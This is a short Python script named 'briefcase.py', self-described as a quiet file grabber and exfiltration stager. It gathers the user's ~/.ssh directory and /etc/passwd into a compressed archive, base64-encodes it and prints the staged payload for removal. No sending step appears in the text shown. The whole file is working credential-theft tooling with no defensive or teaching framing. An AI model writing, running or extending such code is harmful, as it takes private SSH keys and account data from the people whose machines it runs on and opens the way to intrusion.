# briefcase.py — Quiet File Grabber & Exfil Stager
import os
import base64
import tarfile
from io import BytesIO
from rich import print, panel

def grab_targets():
    targets = ["~/.ssh", "/etc/passwd"]
    payload = BytesIO()
    with tarfile.open(fileobj=payload, mode="w:gz") as tar:
        for path in targets:
            p = os.path.expanduser(path)
            if os.path.exists(p):
                tar.add(p, arcname=os.path.basename(p))
    return base64.b64encode(payload.getvalue()).decode()

def run():
    print(panel.Panel("\U0001F4E5 [bold cyan]BRIEFCASE[/bold cyan] — Data Grabber & Exfil Builder"))
    b64data = grab_targets()
    print("[green]Payload ready. Base64 output below:[/green]\n")
    print(b64data[:512] + "... [truncated]")


main = run
